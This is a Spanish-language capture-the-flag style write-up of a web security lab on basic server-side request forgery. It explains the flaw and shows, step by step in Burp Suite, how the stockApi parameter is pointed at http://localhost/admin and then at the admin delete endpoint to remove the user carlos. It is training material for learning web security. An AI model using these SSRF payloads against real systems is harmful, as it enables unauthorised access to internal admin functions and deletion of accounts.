# 🌐 SSRF básico contra servidor local

## 📄 Descripción del laboratorio

Este laboratorio contiene una vulnerabilidad de **Server-Side Request Forgery (SSRF)** en la funcionalidad de verificación de existencias.

La aplicación permite al servidor realizar **peticiones HTTP a una URL controlada por el usuario** sin aplicar validaciones adecuadas.

🎯 **Objetivo del laboratorio:**

* Acceder a la interfaz de administración interna en `http://localhost/admin`
* Eliminar al usuario `carlos`



## 📚 Teoría

**SSRF (Server-Side Request Forgery)** ocurre cuando una aplicación backend:

* Realiza peticiones HTTP (u otros protocolos) desde el servidor
* Usa input controlado por el usuario para construir la URL de destino
* ❌ No valida ni filtra correctamente destinos internos o sensibles

En este laboratorio:

Existe una funcionalidad **Check stock** que consulta un API interno para verificar existencias.

El parámetro enviado (`stockApi` o similar) contiene una **URL completa que el backend consulta directamente**.

El servidor no bloquea direcciones internas como:

```
http://localhost
http://127.0.0.1
http://[::1]
```

Esto permite:

* Forzar al servidor a hacerse peticiones a sí mismo
* Acceder a servicios internos no expuestos externamente

Caso típico de SSRF:

Acceder a `/admin`, que solo está disponible desde **localhost**.



## 📝 Práctica

### 1️⃣ Interceptar la petición

Navegamos por la tienda y abrimos cualquier producto.

Bajamos hasta **Check stock**, introducimos cualquier valor y pulsamos el botón.

Interceptamos la petición con **Burp Suite**.

La petición suele tener este formato:

```http
POST /product/stock HTTP/1.1
Host: ID-DEL-LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

Enviamos la petición al **Repeater** y decodificamos la URL si está encoded.

### 2️⃣ Comprobando SSRF

Probamos primero una URL simple:

```http
stockApi=http://localhost
```

<img width="1351" height="586" alt="image" src="https://github.com/user-attachments/assets/b0bccfc7-c8d1-4293-95b2-8b711f9c62ed" />
<br>
Respuesta:

La aplicación devuelve **HTML**, lo que indica que existe un servidor web escuchando en `localhost:80`.

En el contenido aparecen enlaces administrativos como `/admin`.



### 3️⃣ Acceso al panel interno

Probamos acceder directamente al panel:

```http
stockApi=http://localhost/admin
```

<img width="1349" height="767" alt="image" src="https://github.com/user-attachments/assets/bb0eba91-b975-4230-8725-29a734c29ac7" />
<br>
La respuesta devuelve el **HTML completo del panel de administración**, incluyendo:

* Listado de usuarios
* Acción para eliminar a `carlos`

Al inspeccionar el HTML observamos la acción utilizada para eliminar usuarios:

```http
GET /admin/delete?username=carlos
```



### 4️⃣ Ejecución de la acción interna

Construimos la URL SSRF final:

```http
stockApi=http://localhost/admin/delete?username=carlos
```

Enviamos la petición desde **Repeater**.

<img width="1357" height="566" alt="image" src="https://github.com/user-attachments/assets/1c1ec652-1fa5-4499-81a3-27185a16c249" />



### 5️⃣ Resultado final

La respuesta devuelve un **302 Found** o un mensaje de éxito.

El servidor ha realizado la petición internamente desde `localhost`, ejecutando la acción administrativa.

El usuario **carlos ha sido eliminado**.

✅ **Laboratorio resuelto.**
